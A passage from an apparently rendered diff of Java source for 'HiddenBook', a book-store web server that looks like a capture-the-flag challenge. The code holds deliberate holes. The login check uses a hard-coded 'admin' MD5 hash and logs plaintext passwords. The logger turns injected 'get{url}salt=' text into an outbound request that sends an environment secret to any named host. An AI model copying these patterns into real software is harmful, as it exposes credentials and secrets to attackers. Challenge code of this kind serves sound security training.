+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">messageDigest</span> <span class="o">=</span> <span class="n">md</span><span class="o">.</span><span class="na">digest</span><span class="o">(</span><span class="n">input</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">BigInteger</span> <span class="n">no</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BigInteger</span><span class="o">(</span><span class="n">1</span><span class="o">,</span> <span class="n">messageDigest</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">hashtext</span> <span class="o">=</span> <span class="n">no</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">16</span><span class="o">);</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">hashtext</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="n">32</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">hashtext</span> <span class="o">=</span> <span class="s">&#34;0&#34;</span> <span class="o">+</span> <span class="n">hashtext</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="n">hashtext</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">parseRequest</span><span class="o">(</span><span class="n">String</span> <span class="n">requestUri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
+        <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="n">query_params</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">splitQuery</span><span class="o">(</span><span class="n">requestUri</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;password&#34;</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">hashed_username</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">username</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">mssg</span> <span class="o">=</span> <span class="s">&#34;username: &#34;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">&#34;, password: &#34;</span> <span class="o">+</span> <span class="n">password</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">hashed_username</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">hashed_password</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">LoginPageServer</span>
+    <span class="kd">implements</span> <span class="n">HttpHandler</span> <span class="o">{</span>
+        <span class="n">LoginPageServer</span><span class="o">()</span> <span class="o">{}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">HttpExchange</span> <span class="n">t</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+            <span class="n">StringBuilder</span> <span class="n">response</span> <span class="o">=</span> <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">index_page_html</span><span class="o">;</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">getResponseHeaders</span><span class="o">().</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;Content-Type&#34;</span><span class="o">,</span> <span class="s">&#34;text/html&#34;</span><span class="o">);</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">sendResponseHeaders</span><span class="o">(</span><span class="n">200</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">().</span><span class="na">length</span><span class="o">);</span>
+            <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getResponseBody</span><span class="o">();</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">LandingPageServer</span>
+    <span class="kd">implements</span> <span class="n">HttpHandler</span> <span class="o">{</span>
+        <span class="n">LandingPageServer</span><span class="o">()</span> <span class="o">{}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">HttpExchange</span> <span class="n">t</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+            <span class="n">StringBuilder</span> <span class="n">response</span> <span class="o">=</span> <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">landing_page_html</span><span class="o">;</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">getResponseHeaders</span><span class="o">().</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;Content-Type&#34;</span><span class="o">,</span> <span class="s">&#34;text/html&#34;</span><span class="o">);</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">sendResponseHeaders</span><span class="o">(</span><span class="n">200</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
+            <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getResponseBody</span><span class="o">();</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">LoginHandler</span>
+    <span class="kd">implements</span> <span class="n">HttpHandler</span> <span class="o">{</span>
+        <span class="n">LoginHandler</span><span class="o">()</span> <span class="o">{}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">HttpExchange</span> <span class="n">t</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">response</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">parseRequest</span><span class="o">(</span><span class="n">t</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">().</span><span class="na">getQuery</span><span class="o">()))</span> <span class="o">{</span>
+                <span class="n">response</span> <span class="o">=</span> <span class="s">&#34;cool :)&#34;</span><span class="o">;</span>
+                <span class="n">t</span><span class="o">.</span><span class="na">getResponseHeaders</span><span class="o">().</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;auth&#34;</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;WEB_COOKIE&#34;</span><span class="o">));</span>
+                <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">&#34;Authorized access!&#34;</span><span class="o">);</span>
+                <span class="n">t</span><span class="o">.</span><span class="na">sendResponseHeaders</span><span class="o">(</span><span class="n">200</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">response</span> <span class="o">=</span> <span class="s">&#34;sad day today for you :(&#34;</span><span class="o">;</span>
+                <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">warning</span><span class="o">(</span><span class="s">&#34;Unauthorized access!&#34;</span><span class="o">);</span>
+                <span class="n">t</span><span class="o">.</span><span class="na">sendResponseHeaders</span><span class="o">(</span><span class="n">401</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
+            <span class="o">}</span>
+            <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getResponseBody</span><span class="o">();</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">BookHandler</span>
+    <span class="kd">implements</span> <span class="n">HttpHandler</span> <span class="o">{</span>
+        <span class="n">BookHandler</span><span class="o">()</span> <span class="o">{}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">HttpExchange</span> <span class="n">t</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+            <span class="n">StringBuilder</span> <span class="n">response</span> <span class="o">=</span> <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">book_json</span><span class="o">;</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">getResponseHeaders</span><span class="o">().</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;Content-Type&#34;</span><span class="o">,</span> <span class="s">&#34;application/json&#34;</span><span class="o">);</span>
+            <span class="n">t</span><span class="o">.</span><span class="na">sendResponseHeaders</span><span class="o">(</span><span class="n">200</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">().</span><span class="na">length</span><span class="o">);</span>
+            <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="na">getResponseBody</span><span class="o">();</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">getBytes</span><span class="o">());</span>
+            <span class="n">os</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</details>
+
+<details>
+	<summary>App.java</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">book.store</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">book.store.Art</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">book.store.LogJob</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">book.store.ServerSide</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="n">ServerSide</span> <span class="n">ss</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Art</span> <span class="n">art</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Art</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+        <span class="n">art</span><span class="o">.</span><span class="na">printTextArt</span><span class="o">(</span><span class="s">&#34;HiddenBook :)&#34;</span><span class="o">,</span> <span class="n">12</span><span class="o">);</span>
+        <span class="n">ss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerSide</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SERVER_PORT&#34;</span><span class="o">)));</span>
+        <span class="n">LogJob</span> <span class="n">lj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LogJob</span><span class="o">(</span><span class="n">ss</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">lj</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Logger.java</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">book.store</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">book.store.App</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.HttpURLConnection</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.time.LocalDateTime</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.time.format.DateTimeFormatter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.regex.Matcher</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.regex.Pattern</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Logger</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">logfile</span><span class="o">;</span>
+    <span class="n">String</span> <span class="n">className</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">Logger</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">className</span> <span class="o">=</span> <span class="n">className</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">logfile</span> <span class="o">=</span> <span class="n">className</span> <span class="o">+</span> <span class="s">&#34;.log&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeToLogfile</span><span class="o">(</span><span class="n">String</span> <span class="n">logMessage</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">FileWriter</span> <span class="n">fstream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">logfile</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+            <span class="n">BufferedWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="n">fstream</span><span class="o">);</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">analyzeMessage</span><span class="o">(</span><span class="n">logMessage</span><span class="o">);</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">logMessage</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;line.separator&#34;</span><span class="o">));</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Error: &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">analyzeMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">mssg</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;log\\{.*\\}salt&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+        <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+            <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;get\\{.*\\}salt=&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+        <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+        <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">downloadFile</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;book\\{.*\\}salt&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+        <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+        <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+            <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;sussy\\{.*\\}salt&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+        <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+        <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+            <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">downloadFile</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">inputLine</span><span class="o">;</span>
+            <span class="n">URL</span> <span class="n">link</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+            <span class="n">link</span><span class="o">.</span><span class="na">toURI</span><span class="o">();</span>
+            <span class="n">HttpURLConnection</span> <span class="n">conn</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpURLConnection</span><span class="o">)</span> <span class="n">link</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
+            <span class="n">conn</span><span class="o">.</span><span class="na">setRequestMethod</span><span class="o">(</span><span class="s">&#34;GET&#34;</span><span class="o">);</span>
+            <span class="n">conn</span><span class="o">.</span><span class="na">setRequestProperty</span><span class="o">(</span><span class="s">&#34;not-found&#34;</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;NOT_FOUND&#34;</span><span class="o">));</span>
+            <span class="n">conn</span><span class="o">.</span><span class="na">setConnectTimeout</span><span class="o">(</span><span class="n">200</span><span class="o">);</span>
+            <span class="n">conn</span><span class="o">.</span><span class="na">setReadTimeout</span><span class="o">(</span><span class="n">200</span><span class="o">);</span>
+            <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">200</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">BufferedReader</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+            <span class="n">StringBuffer</span> <span class="n">content</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">((</span><span class="n">inputLine</span> <span class="o">=</span> <span class="n">in</span> <span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">content</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">inputLine</span><span class="o">);</span>
+            <span class="o">}</span> <span class="n">in</span> <span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">conn</span><span class="o">.</span><span class="na">disconnect</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="n">String</span> <span class="nf">returnCurrentTime</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">DateTimeFormatter</span> <span class="n">dtf</span> <span class="o">=</span> <span class="n">DateTimeFormatter</span><span class="o">.</span><span class="na">ofPattern</span><span class="o">(</span><span class="s">&#34;yyyy/MM/dd HH:mm:ss&#34;</span><span class="o">);</span>
+        <span class="n">LocalDateTime</span> <span class="n">now</span> <span class="o">=</span> <span class="n">LocalDateTime</span><span class="o">.</span><span class="na">now</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">dtf</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">now</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">error</span><span class="o">(</span><span class="n">String</span> <span class="n">err_mssg</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">curr_time</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">returnCurrentTime</span><span class="o">();</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;ERROR &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[&#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">curr_time</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;] --&gt; &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">err_mssg</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">writeToLogfile</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">info</span><span class="o">(</span><span class="n">String</span> <span class="n">info_mssg</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
